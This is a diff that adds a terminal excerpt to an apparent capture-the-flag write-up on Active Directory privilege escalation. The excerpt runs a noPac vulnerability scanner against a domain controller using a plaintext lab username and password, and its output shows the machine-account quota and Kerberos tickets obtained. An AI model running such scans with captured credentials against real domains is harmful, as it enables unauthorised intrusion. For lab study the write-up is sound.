@@ -1289,6 +1289,24 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 ```
 
+```
+ sudo python3 scanner.py support/support:Ironside47pleasure40Watchful -dc-ip 10.129.50.211 -use-ldap
+[sudo] password for kali: 
+
+███    ██  ██████  ██████   █████   ██████ 
+████   ██ ██    ██ ██   ██ ██   ██ ██      
+██ ██  ██ ██    ██ ██████  ███████ ██      
+██  ██ ██ ██    ██ ██      ██   ██ ██      
+██   ████  ██████  ██      ██   ██  ██████ 
+                                           
+                                        
+    
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Got TGT with PAC from 10.129.50.211. Ticket size 1544
+[*] Got TGT from 10.129.50.211. Ticket size 1544
+
+```
+
 ### Exploitation
 
 Step-by-step privilege escalation.
